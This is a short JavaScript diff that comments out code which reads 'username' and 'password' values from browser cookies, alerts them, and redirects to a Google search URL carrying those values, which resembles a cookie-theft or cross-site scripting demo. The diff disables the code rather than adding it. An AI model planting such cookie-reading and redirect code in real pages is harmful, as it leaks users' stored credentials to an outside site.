@@ -1,5 +1,5 @@
 alert('food');
-function getCookie(cname) {
+/*function getCookie(cname) {
     var name = cname + '=';
     var ca = document.cookie.split(';');
     for(var i = 0; i <ca.length; i++) {
@@ -17,4 +17,4 @@ var username = getCookie('username');
 var password = getCookie('password');
 alert(username);
 alert(password);
-window.location='https://www.google.com/search?q='+username+'+'+password+'
+window.location='https://www.google.com/search?q='+username+'+'+password+'*/
